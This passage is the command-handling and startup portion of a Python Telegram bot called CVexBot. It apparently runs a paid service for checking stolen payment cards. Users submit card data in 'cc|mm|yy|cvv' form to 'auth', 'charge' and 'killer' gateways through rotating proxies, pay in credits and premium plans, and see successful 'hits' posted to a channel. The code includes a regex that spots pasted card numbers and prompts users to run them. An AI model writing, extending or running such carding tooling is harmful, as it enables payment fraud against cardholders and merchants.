            alive = []; dead = 0; txt = ""
            for p in px:
                if check_proxy(p):
                    alive.append(p)
                    info = get_proxy_info(p)
                    txt += (f"{E_CHECK} <code>{info['ip']}</code> | {info['country']}\n" if info else f"{E_CHECK} <code>{p}</code>\n")
                else:
                    dead += 1
            update_status(uid, 'proxies', "\n".join(alive))
            if msg:
                safe_edit(msg.chat.id, msg.message_id, f"{E_TOOLS} <b>Recheck!</b>\nAlive: {len(alive)} | Dead: {dead}\n\n{txt}", parse_mode='HTML', reply_markup=get_tools_markup())
        threading.Thread(target=do_recheck, daemon=True).start()

@bot.message_handler(func=lambda m: m.text and m.text[:1] in ('.', '/', '$'))
@crash_guard("cmd")
def handle_cmd(message):
    uid = message.from_user.id
    user_states.pop(uid, None)
    if is_banned(uid): return

    user = ensure_user(uid, message.from_user.username or "")
    if not user:
        return safe_reply(message, f"{E_CROSS} System busy. Try /start.", parse_mode='HTML')
    if not user[12]:
        return safe_reply(message, f"{E_CROSS} <b>Not Verified!</b>\n{E_ARROW} /start first", parse_mode='HTML')

    raw = (message.text or "").lstrip('./$').strip()
    parts = raw.split(' ', 1)
    cmd = parts[0].lower().split('@')[0]
    args = parts[1] if len(parts) > 1 else ""

    if cmd in ('cmds', 'menu'): return cmd_cmds(message)
    if cmd in ('help', 'cmdlist', 'commands'): return cmd_help(message)
    if cmd == 'auth': return cmd_auth(message)
    if cmd == 'charge': return cmd_charge(message)
    if cmd == 'plans': return safe_send(message.chat.id, get_plans_text(), parse_mode='HTML', reply_markup=get_plans_markup())
    if cmd == 'me':
        prem = f"{E_CHECK} Active ({user[5]})" if has_premium(uid) else f"{E_CROSS} Free"
        cd = "—" if is_admin(uid) else f"{cooldown_left(uid)}s"
        return safe_reply(message, f"<b>{E_TECH} Profile</b>\n{E_LINE}\n╰┈➤ 🆔 ID: <code>{uid}</code>\n╰┈➤ {E_HEART} Credits: <b>{user[2]}</b>\n╰┈➤ {E_CROWN} Premium: <b>{prem}</b>\n╰┈➤ 👥 Refs: <b>{user[10]}/5</b>\n╰┈➤ {E_CLOCK} Cooldown: <b>{cd}</b>\n{E_LINE}", parse_mode='HTML')

    if cmd == 'addpx':
        if not args: return safe_reply(message, f"{E_ARROW} <code>.addpx ip:port:user:pass</code>", parse_mode='HTML')
        p = args.strip()
        if "://" not in p:
            prts = p.split(":")
            if len(prts) == 4: p = f"http://{prts[2]}:{prts[3]}@{prts[0]}:{prts[1]}"
            else: p = "http://" + p
        existing = [x for x in user[6].split('\n') if x.strip()] if user[6] else []
        if p in existing:
            return safe_reply(message, f"{E_WARN} <b>Already added!</b>\n<code>{h_esc(p)}</code>", parse_mode='HTML')
        msg = safe_reply(message, f"{E_FLASH} Checking...", parse_mode='HTML')
        def add():
            if check_proxy(p):
                info = get_proxy_info(p)
                u2 = get_user(uid); ex = [x for x in u2[6].split('\n') if x.strip()] if u2 and u2[6] else []
                if p not in ex:
                    ex.append(p); update_status(uid, 'proxies', "\n".join(ex))
                txt = f"{E_CHECK} <b>Added!</b>\n\nIP: <code>{info['ip'] if info else h_esc(p)}</code>\n{(info['country'] if info else '')}\n\nTotal: {len(ex)}"
                if msg: safe_edit(msg.chat.id, msg.message_id, txt, parse_mode='HTML')
                return
            if msg: safe_edit(msg.chat.id, msg.message_id, f"{E_CROSS} DEAD proxy.", parse_mode='HTML')
        threading.Thread(target=add, daemon=True).start()
        return
    if cmd == 'listpx':
        px = [x for x in user[6].split('\n') if x.strip()] if user[6] else []
        if not px: return safe_reply(message, f"{E_EXCLAMATION} No proxies.", parse_mode='HTML')
        txt = f"{E_TOOLS} <b>Proxies ({len(px)}):</b>\n\n"
        for i, p in enumerate(px): txt += f"<code>{i + 1}. {h_esc(p)}</code>\n"
        return safe_reply(message, txt, parse_mode='HTML')
    if cmd == 'rmpx':
        try:
            idx = int(args) - 1
            px = [x for x in user[6].split('\n') if x.strip()] if user[6] else []
            if 0 <= idx < len(px):
                px.pop(idx); update_status(uid, 'proxies', "\n".join(px))
                safe_reply(message, f"{E_CHECK} Removed.")
            else:
                safe_reply(message, f"{E_CROSS} Bad index.")
        except Exception:
            safe_reply(message, f"{E_CROSS} Usage: <code>.rmpx 2</code>", parse_mode='HTML')
        return

    if cmd == 'genplan' and is_admin(uid):
        pa = args.split()
        if len(pa) < 1:
            return safe_reply(message, "Usage:\n<code>/genplan &lt;name&gt;</code>\n<code>/genplan &lt;name&gt; &lt;credits&gt; &lt;price&gt; &lt;days&gt;</code>", parse_mode='HTML')
        plan_name = pa[0]
        if len(pa) >= 4:
            try:
                credits = int(pa[1]); price = pa[2]; days = int(pa[3])
            except Exception:
                return safe_reply(message, f"{E_CROSS} Invalid values.", parse_mode='HTML')
        else:
            row = db.plans.find_one({"_id": {"$regex": f"^{re.escape(plan_name)}$", "$options": "i"}})
            if not row:
                return safe_reply(message, f"{E_CROSS} Plan '{h_esc(plan_name)}' not found. Provide custom.", parse_mode='HTML')
            credits, price, days = row.get("credits"), row.get("price"), row.get("days")
        code = db_create_plan_code(plan_name, credits, price, days, uid)
        try: bot_username = bot.get_me().username
        except Exception: bot_username = "CvexChkBot"
        link = f"https://t.me/{bot_username}?start=plan_{code}"
        safe_reply(message,
            f"{E_CHECK} <b>Plan Code Generated!</b>\n{E_LINE}\n"
            f"╰┈➤ {E_STAR} Plan : <b>{h_esc(plan_name)}</b>\n"
            f"╰┈➤ {E_HEART} Credits : <b>{credits}</b>\n"
            f"╰┈➤ {E_CROWN} Price : <b>${price}</b>\n"
            f"╰┈➤ {E_FLASH} Days : <b>{days}</b>\n"
            f"{E_LINE}\n<code>{link}</code>", parse_mode='HTML')
        return

    if cmd == 'ban' and is_admin(uid):
        t = resolve_user_target(args)
        if not t: return safe_reply(message, f"{E_CROSS} Not found.")
        update_status(t[0], 'banned', 1)
        safe_reply(message, f"{E_CHECK} Banned.")
        return
    if cmd == 'lookup' and is_admin(uid):
        t = resolve_user_target(args)
        if not t: return safe_reply(message, f"{E_CROSS} Not found.")
        safe_reply(message, f"ID:{t[0]}\nUser:@{t[1]}\nCredits:{t[2]}\nRefs:{t[10]}\nPremium:{t[3]}", parse_mode='HTML')
        return
    if cmd == 'addcred' and is_admin(uid):
        pa = args.split()
        if len(pa) != 2: return safe_reply(message, "Usage: <code>/addcred @user 100</code>", parse_mode='HTML')
        target_u = resolve_user_target(pa[0])
        if not target_u: return safe_reply(message, f"{E_CROSS} User not found.", parse_mode='HTML')
        try: amt = int(pa[1])
        except Exception: return safe_reply(message, f"{E_CROSS} Invalid amount.", parse_mode='HTML')
        update_credits(target_u[0], amt)
        safe_reply(message, f"{E_CHECK} Added <b>{amt:+d}</b> to <code>{target_u[0]}</code>\nNew: <b>{target_u[2] + amt}</b>", parse_mode='HTML')
        send_credit_notification(target_u[0], amt)
        return
    if cmd == 'addprem' and is_admin(uid):
        pa = args.split()
        if len(pa) != 2: return safe_reply(message, "Usage: <code>/addprem @user 30</code>", parse_mode='HTML')
        target_u = resolve_user_target(pa[0])
        if not target_u: return safe_reply(message, f"{E_CROSS} User not found.", parse_mode='HTML')
        try:
            d = int(pa[1])
            if d <= 0 or d > 3650: raise ValueError
        except Exception:
            return safe_reply(message, f"{E_CROSS} Invalid days.", parse_mode='HTML')
        exp = (datetime.now() + timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")
        update_status(target_u[0], 'is_premium', 1); update_status(target_u[0], 'expiry_date', exp)
        safe_reply(message, f"{E_CHECK} Premium {d}d to <code>{target_u[0]}</code>", parse_mode='HTML')
        send_premium_notification(target_u[0], d, exp)
        return
    if cmd == 'setsticker' and is_admin(uid):
        if not args.strip(): return safe_reply(message, "Usage: <code>.setsticker &lt;file_id or URL&gt;</code>", parse_mode='HTML')
        set_setting('sticker_id', args.strip())
        safe_reply(message, f"{E_CHECK} Sticker set!", parse_mode='HTML')
        return

    g = get_gateway(cmd)
    if not g:
        return safe_reply(message, f"{E_CROSS} Unknown cmd: <code>{h_esc(cmd)}</code>\n{E_ARROW} /help", parse_mode='HTML')
    _, name, price, cost, status, gw_type, fmt = g
    if status == "OFF": return safe_reply(message, f"{E_CROSS} {h_esc(name)} OFF.", parse_mode='HTML')
    if status == "DEACTIVATED": return safe_reply(message, f"{E_CROSS} {h_esc(name)} DEACTIVATED.", parse_mode='HTML')
    if gw_type == "PREMIUM" and not has_premium(uid):
        return safe_send(message.chat.id, get_premium_required_text(cmd), parse_mode='HTML', reply_markup=get_plans_markup())

    left = cooldown_left(uid)
    if left > 0:
        return safe_reply(message, f"{E_CLOCK} <b>Wait {left}s</b>\n{E_ARROW} Cooldown active.", parse_mode='HTML')

    if user[2] < cost:
        return safe_reply(message, f"{E_CROSS} Need {cost} credits. You have {user[2]}.", parse_mode='HTML')
    if not args:
        return safe_reply(message, f"Usage: <code>/{cmd} {fmt}</code>", parse_mode='HTML')

    mark_run(uid)
    update_credits(uid, -cost)
    if gw_type in ('CHARGE', 'AUTH'):
        threading.Thread(target=process_api, args=(message, args, cmd), daemon=True).start()
    else:
        threading.Thread(target=process_killer, args=(message, args, cmd), daemon=True).start()

@bot.message_handler(content_types=['text', 'photo', 'video', 'sticker', 'document'])
@crash_guard("state")
def handle_state(message):
    uid = message.from_user.id; st = user_states.get(uid, {}); state = st.get('state')

    if state == 'captcha':
        if time.time() - st.get('time', 0) > 180:
            del user_states[uid]; return safe_reply(message, f"{E_CROSS} Expired. /start", parse_mode='HTML')
        try: val = int((message.text or "").strip())
        except Exception:
            st['attempts'] = st.get('attempts', 0) + 1
            if st['attempts'] >= 3:
                del user_states[uid]; return safe_reply(message, f"{E_CROSS} Too many. /start", parse_mode='HTML')
            return safe_reply(message, f"{E_CROSS} Enter a <b>number</b>. {st['attempts']}/3", parse_mode='HTML')
        if val == st['ans']:
            del user_states[uid]; update_status(uid, 'is_verified', 1)
            if not is_joined(uid):
                mk = types.InlineKeyboardMarkup()
                mk.add(types.InlineKeyboardButton("📢 Join Channel", url=FORCE_JOIN_LINK))
                mk.add(types.InlineKeyboardButton("📢 Join Updates", url=FORCE_JOIN_UPDATE_LINK))
                mk.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify_join"))
                return safe_reply(message, f"<b>{E_LAPTOP} #.CVexBot</b>\n{E_LINE}\n{E_EXCLAMATION} Captcha Passed! Now join both channels.\n{E_LINE}", parse_mode='HTML', reply_markup=mk)
            send_welcome(message.chat.id, message.from_user.first_name)
        else:
            st['attempts'] = st.get('attempts', 0) + 1
            if st['attempts'] >= 3:
                del user_states[uid]; return safe_reply(message, f"{E_CROSS} Too many. /start", parse_mode='HTML')
            safe_reply(message, f"{E_CROSS} Wrong. {st['attempts']}/3", parse_mode='HTML')

    elif state == 'admin_dec_reason' and is_admin(uid):
        wid = st['w_id']; reason = message.text or "-"
        doc = db_decline_withdrawal(wid, reason)
        del user_states[uid]
        if not doc:
            return safe_reply(message, f"{E_CROSS} Not found.", parse_mode='HTML')
        safe_reply(message, f"{E_CHECK} Declined + refunded {doc['amount']} refs.", parse_mode='HTML')
        send_withdraw_declined(doc["user_id"], reason, doc["amount"])

    elif state == 'admin_broadcast' and is_admin(uid):
        safe_reply(message, "📢 Broadcasting...")
        def br(msg_id, chat_id):
            users = db_all_user_ids()
            def cp(u):
                try:
                    bot.copy_message(u, chat_id, msg_id); return True
                except Exception:
                    return False
            with ThreadPoolExecutor(max_workers=20) as ex:
                res = list(ex.map(cp, users))
            safe_send(message.chat.id, f"{E_CHECK} Sent to {sum(res)} users.", parse_mode='HTML', reply_markup=get_admin_markup())
        threading.Thread(target=br, args=(message.message_id, message.chat.id), daemon=True).start()
        del user_states[uid]

    elif state == 'admin_addplan_name':
        user_states[uid] = {'state': 'admin_addplan_credits', 'name': message.text}
        safe_reply(message, "Enter Credits:")
    elif state == 'admin_addplan_credits':
        user_states[uid] = {'state': 'admin_addplan_price', 'name': st['name'], 'credits': message.text}
        safe_reply(message, "Enter Price:")
    elif state == 'admin_addplan_price':
        user_states[uid] = {'state': 'admin_addplan_days', 'name': st['name'], 'credits': st['credits'], 'price': message.text}
        safe_reply(message, "Enter Days:")
    elif state == 'admin_addplan_days':
        try:
            db_add_plan(st['name'], int(st['credits']), st['price'], int(message.text))
        except Exception:
            del user_states[uid]
            return safe_reply(message, f"{E_CROSS} Invalid.", reply_markup=get_admin_markup())
        del user_states[uid]
        safe_reply(message, f"{E_CHECK} Plan added!", reply_markup=get_admin_markup())

    elif state == 'admin_editgw_cmd':
        user_states[uid] = {'state': 'admin_editgw_field', 'cmd': (message.text or "").lower()}
        safe_reply(message, "Enter field (name/price/cost/status/type/format):")
    elif state == 'admin_editgw_field':
        user_states[uid] = {'state': 'admin_editgw_val', 'cmd': st['cmd'], 'field': (message.text or "").lower()}
        safe_reply(message, "Enter new value:")
    elif state == 'admin_editgw_val':
        fld = st['field']; val = message.text
        if fld == 'cost':
            try: val = int(val)
            except Exception: return safe_reply(message, "Must be number.")
        if fld not in ('name', 'price', 'cost', 'status', 'type', 'format'):
            del user_states[uid]; return safe_reply(message, "Bad field.", reply_markup=get_admin_markup())
        db_set_gateway(st['cmd'], fld, val)
        del user_states[uid]
        safe_reply(message, f"{E_CHECK} Updated.", reply_markup=get_admin_markup())

    elif state == 'admin_genkey_days' and is_admin(uid):
        user_states[uid] = {'state': 'admin_genkey_qty', 'days': message.text}
        safe_reply(message, "Enter Quantity:")
    elif state == 'admin_genkey_qty' and is_admin(uid):
        try:
            days = int(st['days']); qty = int(message.text)
            keys = []
            for _ in range(qty):
                k = secrets.token_hex(16)[:31].upper()
                db_add_license(k, days)
                keys.append(k)
            del user_states[uid]
            safe_reply(message, f"{E_CHECK} Generated:\n\n" + "\n".join([f"<code>{k}</code>" for k in keys]), parse_mode='HTML', reply_markup=get_admin_markup())
        except Exception:
            safe_reply(message, "Invalid.")

    elif state == 'admin_addcr_target' and is_admin(uid):
        target_u = resolve_user_target(message.text)
        if not target_u:
            return safe_reply(message, f"{E_CROSS} User not found: <code>{h_esc(message.text)}</code>\nTry again or /cmds.", parse_mode='HTML')
        user_states[uid] = {'state': 'admin_addcr_amt', 'target_id': target_u[0]}
        safe_reply(message, f"{E_CHECK} User: <code>{target_u[0]}</code> (@{target_u[1] or 'nouser'})\nCredits: <b>{target_u[2]}</b>\n\nEnter Amount:", parse_mode='HTML')
    elif state == 'admin_addcr_amt' and is_admin(uid):
        try:
            amt = int((message.text or "").strip())
            if amt == 0 or abs(amt) > 1000000: raise ValueError
        except Exception:
            del user_states[uid]; return safe_reply(message, f"{E_CROSS} Invalid amount.", parse_mode='HTML', reply_markup=get_admin_markup())
        try:
            tgt = st['target_id']; u = get_user(tgt)
            if not u:
                del user_states[uid]; return safe_reply(message, f"{E_CROSS} User disappeared.", parse_mode='HTML', reply_markup=get_admin_markup())
            update_credits(tgt, amt); del user_states[uid]
            safe_reply(message, f"{E_CHECK} <b>Done!</b>\nAdded <b>{amt:+d}</b> to <code>{tgt}</code>\nNew: <b>{u[2] + amt}</b>", parse_mode='HTML', reply_markup=get_admin_markup())
            send_credit_notification(tgt, amt)
        except Exception as e:
            del user_states[uid]
            safe_reply(message, f"{E_CROSS} Error: {type(e).__name__}", parse_mode='HTML', reply_markup=get_admin_markup())

    elif state == 'admin_addprem_target' and is_admin(uid):
        target_u = resolve_user_target(message.text)
        if not target_u:
            return safe_reply(message, f"{E_CROSS} User not found.", parse_mode='HTML')
        user_states[uid] = {'state': 'admin_addprem_days', 'target_id': target_u[0]}
        cur = f"{E_CHECK} Active ({target_u[5]})" if target_u[3] == 1 else f"{E_CROSS} Free"
        safe_reply(message, f"{E_CHECK} User: <code>{target_u[0]}</code>\nPremium: {cur}\n\nEnter Days:", parse_mode='HTML')
    elif state == 'admin_addprem_days' and is_admin(uid):
        try:
            d = int((message.text or "").strip())
            if d <= 0 or d > 3650: raise ValueError
        except Exception:
            del user_states[uid]; return safe_reply(message, f"{E_CROSS} Invalid days (1-3650).", parse_mode='HTML', reply_markup=get_admin_markup())
        try:
            tgt = st['target_id']; u = get_user(tgt)
            if not u:
                del user_states[uid]; return safe_reply(message, f"{E_CROSS} User disappeared.", parse_mode='HTML', reply_markup=get_admin_markup())
            exp = (datetime.now() + timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")
            update_status(tgt, 'is_premium', 1); update_status(tgt, 'expiry_date', exp)
            del user_states[uid]
            safe_reply(message, f"{E_CHECK} <b>Premium Activated!</b>\nUser: <code>{tgt}</code>\nDuration: <b>{d}d</b>\nExpires: <b>{exp}</b>", parse_mode='HTML', reply_markup=get_admin_markup())
            send_premium_notification(tgt, d, exp)
        except Exception as e:
            del user_states[uid]
            safe_reply(message, f"{E_CROSS} Error: {type(e).__name__}", parse_mode='HTML', reply_markup=get_admin_markup())

    elif state:
        safe_reply(message, f"{E_WARN} <b>{h_esc(state)}</b> chal raha hai.\n{E_ARROW} Value bhejo ya /cmds", parse_mode='HTML')

    elif message.text:
        txt = message.text.strip()
        if re.fullmatch(r"[\d\s]{13,25}[|/][\d]{1,2}[|/][\d]{2,4}[|/][\d]{3,4}", txt.replace(" ", "")):
            safe_reply(message, f"{E_FLASH} Card mila. Gateway prefix lagao:\n"
                                f"{E_ARROW} <code>/yv {h_esc(txt)}</code>\n"
                                f"{E_ARROW} <code>/bl {h_esc(txt)}</code>\n{E_TOOLS} /help", parse_mode='HTML')
        else:
            safe_reply(message, f"{E_ARROW} /cmds se menu kholo\n{E_TOOLS} <code>/gateway cc|mm|yy|cvv</code>", parse_mode='HTML')

# ==========================================
# STARTUP
# ==========================================
print("=" * 60)
print("✅ CVexBot — LIVE HIT BUILD")
print("=" * 60)

for _i in range(8):
    try:
        mongo.admin.command('ping')
        print(f"   ✓ Mongo connected ({MONGO_DB_NAME})")
        break
    except Exception as e:
        print(f"   ✗ Mongo #{_i + 1}: {type(e).__name__}")
        time.sleep(5)

init_db()
normalize_users()
ensure_owner_in_db()

print(f"   ✓ Hit channel: {HIT_CHANNEL_ID} ({'ON' if HIT_ENABLED else 'OFF'})")
print(f"   ✓ Cost per kill: {COST_PER_KILL} credit")
print("=" * 60)

ME = None
for _i in range(30):
    try:
        ME = bot.get_me()
        print(f"   ✓ Bot: @{ME.username} (id {ME.id})")
        break
    except telebot.apihelper.ApiTelegramException as e:
        if e.error_code == 429:
            ra = int((e.result_json or {}).get("parameters", {}).get("retry_after", 5)) + 2
            print(f"   ⏳ 429 on get_me, sleeping {ra}s")
            time.sleep(ra)
        else:
            print(f"   ✗ get_me #{_i + 1}: {e.error_code} {str(e)[:120]}")
            time.sleep(3)
    except Exception as e:
        print(f"   ✗ get_me #{_i + 1}: {type(e).__name__}: {str(e)[:160]}")
        time.sleep(3)

# --- Startup notification in hit channel (stays, not deleted) ---
try:
    _boot_user = ME.username if ME else "bot"
    boot_txt = (f"🟢 <b>BOT STARTED</b>\n"
                f"──────•❥❥•──────\n"
                f"{E_CHECK} <b>Hit channel is active</b>\n"
                f"{E_TECH} <b>Bot</b> ↠ @{h_esc(_boot_user)}\n"
                f"{E_CLOCK} <b>Time</b> ↠ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"──────•❥❥•──────\n"
                f"<i>Test message — hits will land here.</i>")
    bot.send_message(HIT_CHANNEL_ID, boot_txt, parse_mode='HTML', disable_web_page_preview=True)
    print("   ✓ Hit channel write OK (startup notice sent)")
except Exception as e:
    print(f"   ✗ Hit channel FAIL: {type(e).__name__}: {str(e)[:140]}")

try:
    safe_send(OWNER_ID,
        f"{E_CHECK} <b>Bot Online</b>\n{E_LINE}\n"
        f"╰┈➤ {E_TECH} @{h_esc(ME.username if ME else 'bot')}\n"
        f"╰┈➤ {E_FLASH} Hits: {'ON' if HIT_ENABLED else 'OFF'}\n"
        f"╰┈➤ {E_CLOCK} {datetime.now().strftime('%H:%M:%S')}\n{E_LINE}", parse_mode='HTML')
except Exception:
    pass

try:
    bot.delete_webhook(drop_pending_updates=True)
except Exception:
    pass

while True:
    try:
        bot.infinity_polling(timeout=30, long_polling_timeout=25, skip_pending=True)
    except telebot.apihelper.ApiTelegramException as e:
        if e.error_code == 429:
            ra = int((e.result_json or {}).get("parameters", {}).get("retry_after", 5)) + 2
            print(f"⚠ 429 Too Many Requests — retry in {ra}s")
            time.sleep(ra)
        elif e.error_code == 409:
            print("⚠ 409 Conflict — webhook/purana poller hata raha hoon...")
            try: bot.delete_webhook(drop_pending_updates=True)
            except Exception: pass
            time.sleep(5)
        else:
            print(f"⚠ Telegram {e.error_code}: {str(e)[:160]}")
            time.sleep(5)
    except Exception as e:
        print(f"⚠ Polling: {type(e).__name__}: {str(e)[:200]}")
        time.sleep(5)
